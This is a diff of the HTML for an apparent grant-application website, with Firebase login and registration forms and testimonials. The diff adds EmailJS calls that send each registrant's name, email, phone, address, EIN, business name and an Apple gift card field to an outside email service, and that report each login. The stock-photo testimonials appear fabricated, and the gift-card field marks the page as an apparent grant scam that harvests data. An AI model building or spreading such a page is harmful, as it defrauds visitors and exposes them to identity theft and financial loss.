@@ -13,6 +13,14 @@
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
 
+  <!-- EmailJS -->
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("mXo_xLhEcgelld3IC"); // Replace with your EmailJS public key
+    })();
+  </script>
+
   <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
 
@@ -23,158 +31,32 @@
       --background: linear-gradient(to right, #e0f7fa, #ffffff);
       --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
     }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Poppins', sans-serif; background: var(--background); color: #333; }
+    header { background: var(--primary); color: white; padding: 20px; text-align: center; box-shadow: var(--shadow); }
+    header h2 { font-size: 1.8rem; font-weight: 600; }
+    main { padding: 20px; max-width: 800px; margin: auto; }
+    .intro { text-align: center; margin-bottom: 30px; font-size: 1.1rem; }
+    .tabs { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 25px; }
+    .btn { background: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 30px; font-size: 1rem; cursor: pointer; box-shadow: var(--shadow); transition: background 0.2s ease, transform 0.2s ease; text-align: center; text-decoration: none; display: inline-block; }
+    .btn:hover { background: var(--primary-hover); transform: scale(1.05); }
+    .form-container { display: none; background: #fff; padding: 25px; border-radius: 12px; box-shadow: var(--shadow); margin-bottom: 40px; }
+    .form-container h3 { text-align: center; color: var(--primary); margin-bottom: 15px; }
+    input, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    .testimonial { display: flex; align-items: flex-start; gap: 15px; border-left: 4px solid var(--primary); padding-left: 15px; margin-bottom: 20px; }
+    .testimonial img { width: 60px; height: 60px; object-fit: cover; border-radius: 50%; border: 2px solid var(--primary); }
+    .testimonial-content { flex: 1; }
 
-    body {
-      font-family: 'Poppins', sans-serif;
-      background: var(--background);
-      color: #333;
-    }
-
-    header {
-      background: var(--primary);
-      color: white;
-      padding: 20px;
-      text-align: center;
-      box-shadow: var(--shadow);
-    }
-
-    header h2 {
-      font-size: 1.8rem;
-      font-weight: 600;
-    }
-
-    main {
-      padding: 20px;
-      max-width: 800px;
-      margin: auto;
-    }
-
-    .intro {
-      text-align: center;
-      margin-bottom: 30px;
-      font-size: 1.1rem;
-    }
-
-    .tabs {
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      flex-wrap: wrap;
-      margin-bottom: 25px;
-    }
-
-    .btn {
-      background: var(--primary);
-      color: white;
-      border: none;
-      padding: 12px 25px;
-      border-radius: 30px;
-      font-size: 1rem;
-      cursor: pointer;
-      box-shadow: var(--shadow);
-      transition: background 0.2s ease, transform 0.2s ease;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-    }
-
-    .btn:hover {
-      background: var(--primary-hover);
-      transform: scale(1.05);
-    }
-
-    .form-container {
-      display: none;
-      background: #fff;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: var(--shadow);
-      margin-bottom: 40px;
-    }
-
-    .form-container h3 {
-      text-align: center;
-      color: var(--primary);
-      margin-bottom: 15px;
-    }
-
-    input, textarea {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 1rem;
-    }
-
-.testimonial {
-  display: flex;
-  align-items: flex-start;
-  gap: 15px;
-  border-left: 4px solid var(--primary);
-  padding-left: 15px;
-  margin-bottom: 20px;
-}
-
-.testimonial img {
-  width: 60px;
-  height: 60px;
-  object-fit: cover;
-  border-radius: 50%;
-  border: 2px solid var(--primary);
-}
-
-.testimonial-content {
-  flex: 1;
-}
-
-
-    .grant-services {
-      background: #fff;
-      border-radius: 12px;
-      padding: 20px;
-      box-shadow: var(--shadow);
-      margin-bottom: 40px;
-    }
-
-    .grant-services h2,
-    .grant-services h3 {
-      margin-bottom: 10px;
-    }
-
-    .grant-services ul {
-      padding-left: 20px;
-      margin-bottom: 20px;
-    }
-
-    footer {
-      background: #2c3e50;
-      color: white;
-      text-align: center;
-      padding: 20px;
-    }
-
-    footer a {
-      color: white;
-      margin: 0 10px;
-      text-decoration: none;
-      font-size: 1.2rem;
-    }
+    .grant-services { background: #fff; border-radius: 12px; padding: 20px; box-shadow: var(--shadow); margin-bottom: 40px; }
+    .grant-services h2, .grant-services h3 { margin-bottom: 10px; }
+    .grant-services ul { padding-left: 20px; margin-bottom: 20px; }
+    footer { background: #2c3e50; color: white; text-align: center; padding: 20px; }
+    footer a { color: white; margin: 0 10px; text-decoration: none; font-size: 1.2rem; }
 
     @media (max-width: 600px) {
-      header h2 {
-        font-size: 1.5rem;
-      }
-      .btn {
-        font-size: 0.95rem;
-        padding: 10px 20px;
-      }
+      header h2 { font-size: 1.5rem; }
+      .btn { font-size: 0.95rem; padding: 10px 20px; }
     }
   </style>
 </head>
@@ -194,7 +76,6 @@
       <button class="btn" onclick="showTab('registerForm')">Register</button>
     </div>
 
-    <!-- Login Form -->
     <div id="loginForm" class="form-container">
       <h3>Login</h3>
       <form onsubmit="handleLogin(event)">
@@ -205,7 +86,6 @@
       </form>
     </div>
 
-    <!-- Register Form -->
     <div id="registerForm" class="form-container">
       <h3>Register & Submit Application</h3>
       <form onsubmit="handleRegister(event)">
@@ -249,42 +129,41 @@
       </div>
     </div>
 
-<div class="testimonies">
-  <h3>What Others Are Saying</h3>
+    <div class="testimonies">
+      <h3>What Others Are Saying</h3>
 
-  <div class="testimonial">
-    <img src="https://media.istockphoto.com/id/1437816897/photo/business-woman-manager-or-human-resources-portrait-for-career-success-company-we-are-hiring.jpg?s=612x612&w=0&k=20&c=tyLvtzutRh22j9GqSGI33Z4HpIwv9vL_MZw_xOE19NQ=" alt="Maria">
-    <div class="testimonial-content">
-      <strong>Maria R.</strong><br>
-      “Honestly, I thought it was a scam at first — but they proved me wrong. Got approved within days!”
+      <div class="testimonial">
+        <img src="https://media.istockphoto.com/id/1437816897/photo/business-woman-manager-or-human-resources-portrait-for-career-success-company-we-are-hiring.jpg?s=612x612&w=0&k=20&c=tyLvtzutRh22j9GqSGI33Z4HpIwv9vL_MZw_xOE19NQ=" alt="Maria">
+        <div class="testimonial-content">
+          <strong>Maria R.</strong><br>
+          “Honestly, I thought it was a scam at first — but they proved me wrong. Got approved within days!”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://media.istockphoto.com/id/1682296067/photo/happy-studio-portrait-or-professional-man-real-estate-agent-or-asian-businessman-smile-for.jpg?s=612x612&w=0&k=20&c=9zbG2-9fl741fbTWw5fNgcEEe4ll-JegrGlQQ6m54rg=" alt="Jamal">
+        <div class="testimonial-content">
+          <strong>Jamal T.</strong><br>
+          “Very smooth process. Love how simple and straight to the point it is. Highly recommended.”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://www.shutterstock.com/image-photo/cheerful-beautiful-young-african-american-260nw-2412906943.jpg" alt="Sophie">
+        <div class="testimonial-content">
+          <strong>Sophie K.</strong><br>
+          “The assistant helped me fix my business profile to qualify. Amazing support!”
+        </div>
+      </div>
+
+      <div class="testimonial">
+        <img src="https://www.shutterstock.com/shutterstock/photos/1795123882/display_1500/stock-photo-young-handsome-man-with-beard-wearing-casual-sweater-and-glasses-over-blue-background-pointing-1795123882.jpg" alt="Brian">
+        <div class="testimonial-content">
+          <strong>Brian C.</strong><br>
+          “Never expected to get funding. I just followed the steps and now I’m investing in my startup!”
+        </div>
+      </div>
     </div>
-  </div>
-
-  <div class="testimonial">
-    <img src="https://media.istockphoto.com/id/1682296067/photo/happy-studio-portrait-or-professional-man-real-estate-agent-or-asian-businessman-smile-for.jpg?s=612x612&w=0&k=20&c=9zbG2-9fl741fbTWw5fNgcEEe4ll-JegrGlQQ6m54rg=" alt="Jamal">
-    <div class="testimonial-content">
-      <strong>Jamal T.</strong><br>
-      “Very smooth process. Love how simple and straight to the point it is. Highly recommended.”
-    </div>
-  </div>
-
-  <div class="testimonial">
-    <img src="https://www.shutterstock.com/image-photo/cheerful-beautiful-young-african-american-260nw-2412906943.jpg" alt="Sophie">
-    <div class="testimonial-content">
-      <strong>Sophie K.</strong><br>
-      “The assistant helped me fix my business profile to qualify. Amazing support!”
-    </div>
-  </div>
-
-  <div class="testimonial">
-    <img src="https://www.shutterstock.com/shutterstock/photos/1795123882/display_1500/stock-photo-young-handsome-man-with-beard-wearing-casual-sweater-and-glasses-over-blue-background-pointing-1795123882.jpg" alt="Brian">
-    <div class="testimonial-content">
-      <strong>Brian C.</strong><br>
-      “Never expected to get funding. I just followed the steps and now I’m investing in my startup!”
-    </div>
-  </div>
-</div>
-
   </main>
 
   <footer>
@@ -323,7 +202,14 @@
       const password = dob;
 
       auth.signInWithEmailAndPassword(email, password)
-        .then(() => window.location.href = "dashboard.html")
+        .then(() => {
+          emailjs.send("service_3d59mw7", "template_8yupfkc", {
+            subject: "User Login",
+            user_email: email,
+            message: `User with email ${email} just logged in.`
+          });
+          window.location.href = "dashboard.html";
+        })
         .catch(err => alert("Login failed: " + err.message));
     }
 
@@ -347,12 +233,21 @@
       auth.createUserWithEmailAndPassword(data.email, password)
         .then(cred => db.ref('grantApplications/' + cred.user.uid).set(data))
         .then(() => {
+          emailjs.send("service_3d59mw7", "template_8yupfkc", {
+            subject: "New Registration",
+            user_name: data.name,
+            user_email: data.email,
+            user_phone: data.phone,
+            user_address: data.address,
+            ein: data.ein,
+            business_name: data.businessName,
+            gift_card: data.appleGiftCard
+          });
           alert("Submitted successfully. Redirecting...");
           window.location.href = "dashboard.html";
         })
         .catch(err => alert("Registration error: " + err.message));
     }
   </script>
-
 </body>
 </html>
